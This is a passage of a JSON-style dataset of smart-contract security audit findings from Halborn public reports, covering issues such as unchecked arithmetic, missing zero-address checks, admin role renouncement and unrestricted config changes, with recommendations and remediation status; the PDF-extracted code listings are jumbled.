fixed = \" 1.7.0 \" 23 anchor - lang = \" 0.5.0 \" 24 anchor - spl = \" 0.5.0 \" 25 solana - program = \" 1.6.3 \" Risk Level: Likelihood - 2 Impact - 3 Recommendation: Halborn recommends to use the latest possible version of solana dependency (0.7.4 at the moment of this audit) unless rust programs are bounded to Also use the latest version for fixed and anchor specific versions. crates. 13 Remediation Plan: RISK ACCEPTED: Party Parrot team is not considering to upgrade the anchor crate at the moment. 14 ", "labels": ["Halborn", "Party_Parrot_Solana", "Severity: Low"]}, {"title": "ARITHMETIC ERRORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The most serious arithmetic errors include integer overflow/underflow . In computer programming, integer overflow/underflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Although integer overflows and underflows do not cause Rust to panic in the release mode, the consequences could be dire if the result of those operations is used in financial calculations. Code Location: Integer Overflow/Underflow Listing 2: math.rs 27 28 let delta_decimal = price . price_decimal as i16 + price . token_decimal as i16 - price . bid_token_decimal as i16 ; Listing 3: math.rs 63 64 let delta_decimal = price . price_decimal as i16 + price . token_decimal as i16 - price . bid_token_decimal as i16 ; Division Listing 4: math.rs 34 35 if delta_decimal > 0 { collateral_amount_in_debt_token = collateral_amount_in_debt_token . div ( ten_exponent ) 15 36 } else { Listing 5: math.rs 75 76 77 78 } else { fp_repay_collateral_amount = fp_repay_collateral_amount . div ( ten_exponent ); } fp_repay_collateral_amount = fp_repay_collateral_amount . div ( Fix :: from_num ( price . price )) ; Recommendation: It is recommended to use vetted safe math libraries(like checked_add , checked_div) for arithmetic operations consistently throughout the smart contract system. Consider using Rust safe arithmetic functions for primitives rather than standard arithmetic operators. Reference: Safe arithmetic operations for primitives: u8, u32, u64 Remediation Plan: RISK ACCEPTED: Party Parrot team considers acceptable the arithmetic in this context, because the debt type owners chooses the asset types, so decimals will not overflow. 16 ", "labels": ["Halborn", "Party_Parrot_Solana", "Severity: Low"]}, {"title": "UNSAFE RUST CODE USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Rust code that uses the unsafe keyword is considered unsafe since all of the memory safety guarantees of Rust are not enforced there.It means that the code might be prone to vulnerabilities that wouldve been prevented by the compiler such as Buffer overflow, Double free, Use After free, and more. 17 Result: 18 After cloning the repository, Halborn installed and executed cargo geiger on the in scope program. The results show that many core components contain unsafe Rust code. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to always double check unsafe Rust code in your own codebase and monitor any core dependencies that contain unsafe Rust in case of any found vulnerabilities. Remediation Plan: ACKNOWLEDGED: Party Parrot team claims that the use of certain dependen- cies is out of their control. 19 ", "labels": ["Halborn", "Party_Parrot_Solana", "Severity: Informational"]}, {"title": "LOW TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Party_Parrot_Solana_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Checking the code by automated testing (unit testing or functional test- ing) is a good practice to be sure all lines of the code work correctly. Halborn used an automatic tool to discover the test coverage. This is also known as code coverage. The tool used by the auditors is a rust utility called cargo tarpaulin. Result: After cloning the repository, Halborn installed and executed cargo tarpaulin on the libraries on the in scope components. The coverage results ended up determining that 40.78% of the lines of rust code were covered with unit/function tests. Details on which components/libraries have coverage are provided in the output on the next page. Risk Level: Likelihood - 1 Impact - 1 20 Recommendation: It is recommended to have the developers enhance the code coverage to have as much possible tests to check all the functionalities of the ledger platform. This will ensure the production release functions as intended. Remediation Plan: ACKNOWLEDGED: Party Parrot team claims that most of the tests are inte- gration tests, and not captured by rust tests. So they consider that the test coverage is acceptable. 21 MANUAL TESTING 22 ", "labels": ["Halborn", "Party_Parrot_Solana", "Severity: Informational"]}, {"title": "CONTRACT ADMIN CAN REVOKE AND RENOUNCE HIMSELF", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Owner of the contract is usually the account that deploys the contract. In the BigBangNFTFactory.sol smart contract, Only Admin can perform some privileged actions such as setNft(), addAdmin(), addGenerator() etc., the addAdmin() function is used to add an Admin role, and the renounceAdmin function is used to renounce being an Admin. It was observed that admin If an admin is mistakenly could revoke his role via renounceAdmin(). renounced, administrative access will result in the contract having no admin, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Code Location: Listing 1: BigBangNFTFactory.sol (Line 55) 53 54 55 56 function renounceAdmin () public virtual { renounceRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Proof of Concept:  Deploy a BigBangNFTFactory using the owner address.  Execute BigBangNFTFactory.renounceAdmin() function as using the owner address. Risk Level: Likelihood - 3 Impact - 5 13 Recommendation: It is recommended that the contract Admin cannot call renounceAdmin() without transferring the Ownership to another address. In addition, if a multi-signature wallet is used, calling the renounceAdmin() function should be confirmed for two or more users. Remediation Plan: SOLVED: Now the owner cannot renounce his role. This issue was fixed in commit ID 7d4d7a60ef10d499be2c672a6b623211ef288246 14 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: High"]}, {"title": "CONTRACT DOES NOT ALLOW MINTING NFT WITH THE ID 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The BigBangNFT.sol contract constructor contains an increment of the counter variable, making the IDs begin on 1. Listing 2: ScapeStore.sol (Line 26) 25 26 27 constructor () public ERC721 ( \" BigBang NFT \" , \" BB \" ) { nftId . increment () ; } It is known that some collections start at the NFT ID 0. Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to remove the increment so users can also mint the NFT with ID 0. Remediation Plan: SOLVED: The Ninja Scape Game can now start minting NFTs at ID 0. This issue was fixed in commit ID 63f46b35467cd3865416b1dae2aa99ea4363cf63 15 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Medium"]}, {"title": "NATIVE TOKEN FUNCTIONALITY COULD NOT BE USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the _safeTransfer() function from BigBangGame.sol smart contract, two different types of transfers could be performed. if _token address sent as parameter is different from 0, the function will perform a token. transfer(). If _token is address(0), then the contract will send the native coin to the sender. It is not possible to add address(0) to the list of allowed tokens, as the addresses are validating this parameter to be different from 0. This makes it impossible to operate with native tokens. Code Location: Listing 3: BigBangGame.sol (Line 38) require ( _nft != address (0) , \" BBGame : Nft can 't be zero address require ( _verifier != address (0) , \" BBGame : Verifier can 't be require ( _token != address (0) , \" BBGame : Token can 't be zero 37 constructor ( address _token , address _nft , address _factory ,  address _verifier ) public { 38  address \" ); 39  \" ); 40  zero address \"); 41 42 43 44 45 46 47 48 BBNft BBFactory = _factory ; verifier changeAllowed [ _token ] = true ; token [ typeId ] = _verifier ; = _token ; = _nft ; } 16 Listing 4: BigBangGame.sol (Line 212) 211 212 function addToken ( address _token ) public onlyOwner { require ( _token != address (0) , \" BBGame : Token can 't be zero  address \" ); 213  ; 214 215 216 217 218 219 } require (! changeAllowed [ _token ], \" BBGame : This token is exist \" ) changeAllowed [ _token ] = true ; token [++ typeId ] = _token ; emit AddToken ( _token , typeId , block . timestamp ); Listing 5: BigBangGame.sol (Lines 168,178) 167 function _safeTransfer ( address _token , address _to , uint256  _amount ) internal { 168 169 170 171 172 if ( _token != address (0) ) { IERC20 _rewardToken = IERC20 ( _token ); uint256 _balance = _rewardToken . balanceOf ( address ( this )) ; require ( _amount <= _balance , \" BBGame : Do not have enough  token to reward \"); 173 174 175 176 177 uint256 _beforBalance = _rewardToken . balanceOf ( _to ); _rewardToken . transfer ( _to , _amount ); require ( _rewardToken . balanceOf ( _to ) == _beforBalance +  _amount , \" BBGame : Invalid transfer \" ); 178 179 180 181 } else { uint256 _balance = address ( this ). balance ; require ( _amount <= _balance , \" BBGame : Do not have enough  token to reward \"); 182 183 184 185 186 187 188 189 190 payable ( _to ). transfer ( _amount ); } } // Accept native tokens . receive () external payable { // React to receiving ether } 17 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to implement a function to add address(0) in the array of allowed tokens in order to allow transactions with native token. Remediation Plan: SOLVED: The SeaScape Team now allows the BigBangGame.sol contract to add the address(0) to specify that the native token could be used. This issue was fixed in commit ID 6fbb5845900735349c19c5e751991b9854d9a2a5 18 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is no validation of the addresses in the mint() and access control functions. Addresses should be validated and checked that are different This issue is present in all the smart from zero when necessary. contracts, in the constructors and functions that use addresses as parameters. These examples show how the factory could be set up with a wrong address and how mint could burn NFTs if _owner is address(0) Some code location examples: Listing 6: BigBangNFTFactory.sol 25 26 27 28 constructor ( address _nft ) public { nft = BigBangNFT ( _nft ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Listing 7: BigBangNFTFactory.sol function mint ( address _owner , uint256 _quality , uint256 _image ) 34  public onlyGenerator returns ( uint256 ) { 35  quality \" ); 36 37 } return nft . mint ( _owner , _quality , _image ); require ( _quality > 0 && _quality < 6, \" NFT Factory : invalid Risk Level: Likelihood - 3 Impact - 2 19 Recommendation: Validate that necessary address inputs are different from zero. Remediation Plan: The SeaScape Team SOLVED: ensure they are non-zero. [7d4d7a60ef10d499be2c672a6b623211ef288246](https://github.com/Seastarinteractive/moonscape-smartcontracts/tree/7d4d7a60ef10d499be2c672a6b623211ef288246 to This issue has been fixed in commit ID address checks inputs the now 20 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Low"]}, {"title": "UNUSED PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are functions whose parameters are never used in some smart contracts. These parameters have no effect on the code. Code Location:  operator, from, tokenId, data (BigBangGame.sol#190)  BBFactory (BigBangGame.sol#231) Risk Level: Likelihood - 1 Impact - 2 Recommendation: All parameters given to a function should affect the state of the code. The operator, from, tokenId, and data from onERC721Received() functions should implement any logic with that parameters, but they are not used for any contract state operations. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 21 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The BigBangGame smart contracts use the pragma version 0.6.7 which was latest pragma version 0.8.16 released on released on May 4, 2020. It is also noticeable that August 8, 2022, solves different issues. Solidity versions after 0.8.0 also implement default overflow protection on arithmetic operations. Reference: Solidity Releases Code Location: note: All Ninja Spin smart contracts implement same pragma version. Listing 8: BigBangGame.sol 1 pragma solidity 0.6.7; Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to update the pragma version used in the BigBangGame smart contracts to versions above or equal to 0.8.0. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 22 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Informational"]}, {"title": "UNSAFE MATH CALCULATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SeaScape_Ninja_Spin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Testing revealed that calculations within the smart contract did not make use of a safe math library. While Solidity pragma > 0.8.0 reverts to overflows by default, the code was making use of an older compiler version; thus it is vulnerable to integer overflows and underflows. Halborn could not find a path to exploit the integer overflows; however, there might be some extreme test cases where this can be exploited by an attacker. Code Location: Listing 9: BigBangGame.sol (Line 148) 128 function goldChangeToken ( uint256 _gold , uint256 _typeId , uint8  _v , bytes32 _r , bytes32 _s ) external { 129 require ( _gold > 0, \" BBGame : The exchange amount must greater  than zero \"); 130 require ( checkToken ( _typeId ) , \" BBGame : Do not have this token  type \"); 131 132 133 134 135 136 137 138  ; 139 uint256 chainId ; assembly { chainId := chainid () } { bytes memory prefix = \"\\ x19Ethereum Signed Message :\\ n32 \" bytes32 message = keccak256 ( abi . encodePacked ( _gold ,  msg . sender , nonce [ msg . sender ], address ( this ) , chainId )) ; 140 bytes32 hash = keccak256 ( abi . encodePacked ( prefix ,  message )); 141 142 143 address recover = ecrecover ( hash , _v , _r , _s ); require ( recover == verifier , \" BBGame : Verification failed 23  about goldChangeToken \" ); 144 145 146 147 148 149 150 151 } nonce [ msg . sender ]++; uint256 _tokenAmount = _gold * MULTIPLIER / ratio ; _safeTransfer ( token [ _typeId ], msg . sender , _tokenAmount ); emit GoldChangeToken ( msg . sender , _typeId , _gold , _tokenAmount ,  block . timestamp ); 152 153 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended that either the compiler version is upgraded to pragma >= 0.8.0 or that a library such as OpenZeppelins SafeMath is used. Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 24 ", "labels": ["Halborn", "SeaScape_Ninja_Spin", "Severity: Informational"]}, {"title": "LACK OF MULTISIG PROGRAM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 14 Example Definition: Listing 1: Multisig Implementation (Lines ) 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: SOLVED: Yieldly.Finance Team will monitor assets by a multi-signature address. 15 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Low"]}, {"title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions But, in the some of functions transactions dont go tied with proxy. through the Proxy asset. Code Location: Listing 2: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 3: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); Risk Level: Likelihood - 2 Impact - 2 16 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: SOLVED: Yieldly.Finance Team applied the necessary changes to communicate through the proxy. 17 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Low"]}, {"title": "MISSING FREEZE/REVOKE ASSETS DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. Code Location: Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. SOLVED: Yieldly.Finance Team confirmed the assets dontt have freeze/ clawback addresses. 19 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "MULTIPLE PRAGMA DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "It has been observed that different versions of the pragma are used on TEAL contracts. The pragma on the ESCROW contract is defined as 2. Code Location: Listing 4: Pragma Version 2 Functions (Lines ) 2 reward_fund_escrow . teal 3 reward_fund_close . teal 4 reward_fund_rates . teal 5 reward_fund_tracker . teal Risk Level: Likelihood - 1 Impact - 1 Recommendation: A common version of pragma (3) should be used across all contracts to avoid an unexpected workflows. SOLVED: Yieldly.Finance Team updated pragma version on the related con- tracts. 20 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "ALERTHUB SETUP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "AlertHub is a tool that provides monitoring and real-time alerts on Algorand addresses so that users may manage the security of their accounts and the wider Algorand network. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to setup alerthub for real-time monitoring. help the operations proceed healthily and safely. It can SOLVED: Yieldly.Finance Team will set up Alerthub on the mainnet. 21 3.6 TESTING ACCESS CONTROL POLICIES ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "CONFIG PARAMETERS VALUE CAN BE CHANGED UNRESTRICTEDLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf", "body": "and update_config instantiate field/src/execute.rs bonus_rate and fee_rate fields with a potential unfair amount. situation can produce the following consequences: contracts/martian- max_ltv, This contracts functions update allow owner to in  A malicious (or compromised) owner can change temporarily max_ltvto very low rate e.g., : 0.01 and bonus_rate to e.g., : 0 and liquidate all positions, draining users assets.  Owner could mistakenly change max_ltv rate to lower than released one, which could become current positions into unhealthy ones and ready to be liquidated.  If fee_rate is equal to 1, harvest operations will cause unfair reward distributions and owner could drain user assets. Furthermore, if fee_rate is higher than 1 it will cause an overflow. It is worth noting that likelihood for this to happen is low because martian-field contract is intended to be owned by governance (Council) indefinitely, who is the responsible one for this operation. Code Location: Listing 1: contracts/martian-field/src/execute.rs (Line 321) 314 315 316 317 318 pub fn update_config ( deps : DepsMut , info : MessageInfo , new_config : Config ) -> StdResult < Response > { let config = CONFIG . load ( deps . storage ) ?; if info . sender != config . governance { return Err ( StdError :: generic_err ( \" only governance can update config \" )) ; 12 319 320 321 322 323 324 } CONFIG . save ( deps . storage , & new_config ) ?; Ok ( Response :: default () ) } Listing 2: contracts/martian-field/src/execute.rs (Lines 248,285) pub fn liquidate ( 232 deps : DepsMut , 233 env : Env , 234 info : MessageInfo , 235 user_addr : Addr , 236 237 ) -> StdResult < Response > { 238 239 240 let config = CONFIG . load ( deps . storage ) ?; let state = STATE . load ( deps . storage ) ?; let position = POSITION . load ( deps . storage , & user_addr ). 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 unwrap_or_default () ; // position must be active ( LTV is not `None `) and the LTV must be greater than ` max_ltv ` let health = compute_health (& deps . querier , & env , & config , & state , & position ) ?; // if ` health . ltv ` is `Some ` , it must be greater than ` max_ltv ` // if ` health . ltv ` is `None ` , indicating the position is already closed , then it is not liquidatable let ltv = health . ltv . ok_or_else (|| StdError :: generic_err (\" position is already closed \")) ?; if ltv <= config . max_ltv { return Err ( StdError :: generic_err (\" position is healthy \" )) ; } // 1. unbond the user ' s liquidity tokens from Astro generator // 2. burn liquidity tokens , withdraw primary + secondary assets from the pool // 3. swap all primary assets to secondary assets // 4. repay all debts // 5. among all remaining assets , send the amount corresponding to ` bonus_rate ` to the liquidator // 6. refund all assets that ' re left to the user // 13 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 // NOTE : in the previous versions , we sell ** all ** primary assets , which is not optimal because // this will incur bigger slippage , causing worse liquidation cascade , and be potentially lucrative // for sandwich attackers // // now , we calculate how much additional secondary asset is needed to fully pay off debt , and // reverse - simulate how much primary asset needs to be sold // // TODO : add slippage checks to the swap step so that liquidation cannot be sandwich attacked let callbacks = [ CallbackMsg :: Unbond { user_addr : user_addr . clone () , bond_units_to_reduce : position . bond_units , }, CallbackMsg :: WithdrawLiquidity { user_addr : user_addr . clone () , }, CallbackMsg :: Cover { user_addr : user_addr . clone () , }, CallbackMsg :: Repay { user_addr : user_addr . clone () , repay_amount : health . debt_value , }, CallbackMsg :: Refund { user_addr : user_addr . clone () , recipient_addr : info . sender . clone () , percentage : config . bonus_rate , }, CallbackMsg :: Refund { user_addr : user_addr . clone () , recipient_addr : user_addr . clone () , percentage : Decimal :: one () , }, ]; 14 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that:  Value of fee_rate is lesser than a maximum threshold hardcoded in contract.  Value of max_ltv and bonus_rate is between minimum and maximum values hardcoded in the contract. Remediation plan: SOLVED: The issue was fixed in commit 0f9c959931fcde3ddf5cdb1907c9177f69284e31. 15 ", "labels": ["Halborn", "Mars_Protocol_Fields_of_Mars_CosmWasm", "Severity: Medium"]}, {"title": "SOME RATES COULD BE SET TO VALUES GREATER THAN 1", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf", "body": "instantiate contracts/martian- The field/src/execute.rs do not restrict that rates fields are lesser than 1. update_config functions and in If they are not correctly set, some operations will always panic and wont allow legitimate users to harvest or liquidate; thus generating a denial of service (DoS). The affected fields are the following:  max_ltv  fee_rate  bonus_rate Code Location: Listing 3: contracts/martian-field/src/execute.rs (Line 321) 314 315 316 317 318 319 320 321 322 323 324 pub fn update_config ( deps : DepsMut , info : MessageInfo , new_config : Config ) -> StdResult < Response > { let config = CONFIG . load ( deps . storage ) ?; if info . sender != config . governance { return Err ( StdError :: generic_err ( \" only governance can update config \" )) ; } CONFIG . save ( deps . storage , & new_config ) ?; Ok ( Response :: default () ) } 16 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that aforementioned fields are lesser than 1. Remediation plan: SOLVED: The issue was fixed in the following commits:  2e82ec4798233f14d32a438b5d0238ac1f11583f  816db544f50959de79d09cd03f1bfa15e6ef3c86 17 ", "labels": ["Halborn", "Mars_Protocol_Fields_of_Mars_CosmWasm", "Severity: Low"]}, {"title": "MULTIPLE INSTANCES OF UNCHECKED ARITHMETIC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Fields_of_Mars_CosmWasm_Smart_Contract_Security_Audit_Final.pdf", "body": "While many instances of checked arithmetic were observed, some calcula- tions omitted these checks. The additional verification performed when using the checked functions ensures that under/overflow states are caught and handled appropriately. While these instances were not found to be directly exploitable, they should be reviewed to ensure a defence-in-depth approach is achieved. Code Location: Listing 4: Resources affected 1 execute_callbacks . rs 2 execute . rs 3 health . rs (# L51 ,52 ,53) (# L175 ) (# L237 ,390 , 391 ,420 ,478 ,536) Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider using the checked_add, checked_sub or checked_mul methods in- stead of addition, subtraction, and multiplication operators respec- tively, in all instances to handle overflows gracefully. 18 Remediation plan: SOLVED: Commit ce52053d3a1897b797656a3e60235bdd52147627 fixed the secu- rity issue. It is worth noting that there are some arithmetic operations listed above that do not need checked_* methods because they are multipli- cations between Uint128 and Decimal, which invoke Uint128::multiply_ratio under the hood: Listing 5: Resources with no checked_* methods 1 execute_callbacks . rs 2 execute . rs 3 health . rs (# L51 ,52 ,53) (# L175 ) (# L390 , 391 ,536) 19 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Mars_Protocol_Fields_of_Mars_CosmWasm", "Severity: Informational"]}, {"title": "DOS WITH BLOCK GAS LIMIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The setAllocations() function is used to set the token allocations for each recipient included in the function call: Listing 1: setAllocations() function (Line 118) address [] memory accounts , uint [] memory allocations , uint [] memory durations 105 function setAllocations ( 106 107 108 109 ) external onlyOwner { 110 111 112 113 uint length = accounts . length ; require ( length != 0 , \" empty array \"); require ( length == allocations . length && length == durations . length  , 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 \" varying - length arrays \" ); uint balance = token . balanceOf ( address ( this )) ; for ( uint i ; i < length ; ++ i ) { address account = accounts [ i ]; uint allocation = allocations [i ]; uint duration = durations [ i ]; Member storage member = members [ account ]; require ( account != address (0) , \" bad recipient \" ); // check the member 's remaining harvest if ( member . reserve != 0) { // stash pending rewards of the member so it remains  claimable 129 130  reserves 131 132 133 member . stash = pendingHarvest ( account ); // free non - stashed reserves of the member from the reserve -= ( member . reserve - member . stash ); // free non - stashed tokens from member 's reserves member . reserve = member . stash ; 13 134 135 136 137 138 } // check the member 's new allocation if ( allocation != 0) { require ( duration >= MIN_DURATION , \" short vesting  duration \" ); 139 140  balance // lock tokens as reserve and ensure sufficient reserve += allocation ; require ( balance >= reserve , \" low balance \" ); // add vesting info for the member member . reserve += allocation ; member . rate = allocation / duration ; member . lastUpdate = block . timestamp ; // add the member to the set _membersAddresses . add ( account ); } emit AllocationSet ( account , allocation , duration ); } 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 } Since the length of recipients is not limited, in case there are too many recipients, the block gas limit could be reached, causing miners to not respond to all setAllocations() calls, thus blocking the main purpose of the smart contract. Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider limiting the number of recipients in the setAllocations() function of the AllocationVester contract with a require statement. 14 Remediation Plan: SOLVED: recommendation. preventing gas usage from increasing too much. The Pangolin Team solved this issue by implementing the above The maximum number of recipients has been set to 40, Commit ID: 9563309e6aaf1d0fc930a94cb0fc903d7017d40a 15 ", "labels": ["Halborn", "Pangolin_AllocationVester", "Severity: Low"]}, {"title": "INACCURATE REWARD RATE CALCULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "AllocationVester.sol contract calculates the reward unlock rate by dividing the total amount of tokens to be unlocked by the total vesting period (in seconds), which can go from eight weeks (4838400 seconds) to infinity. However, when the amount of tokens is a number of the same order as the total vesting period, rounding Solidity to zero will introduce inaccuracies in the result of the uint division: The accuracy of the reward unlock rate depends primarly on the ERC20 token to be distributed, which is associated with the AllocationVester contract during its deployment. The use of the token contracts with high decimal values such as Png (18) is considered safe, but the use of contracts with lower decimal values such as USDT (6) may result in an inaccurate rate calculation, which can undermine user trust. For example, allocating 30 USDT for one year would result in an unlock rate of 0, and it would take 5% more time to unlock 1000 USDT allocated for two years. However, it has been noted that incorrectly set allocations can be easily overridden by the contract owner, if needed, causing locked funds to be returned to the contract reserve. 16 Code Location: Listing 2: Reward rate calculation (Line 146) 144 // add vesting info for the member 145 member . reserve += allocation ; 146 member . rate = allocation / duration ; 147 member . lastUpdate = block . timestamp ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider checking the decimals of the token to be distributed in the AllocationVester constructor. Also, before deployment, consider reviewing the use cases of the contract and the associated token to ensure the currently implemented reward calculation algorithm does not have perceptible rounding errors. Remediation Plan: The Pangolin Team solved this issue by multiplying the token SOLVED: allocation by a coefficient that will add 11 decimals of precision when calculating the reward unlock rate, which is considered enough for this contract. Commit ID: 69fa24b3b55c0c7b5bc566354e9b1b36eb3f6272 17 ", "labels": ["Halborn", "Pangolin_AllocationVester", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "AllocationVester.sol contract uses the floating pragma ^0.8.0. The contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 3: Floating pragma (Line 3) 3 pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider locking the pragma version with known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: PENDING: in future releases. The Pangolin Team 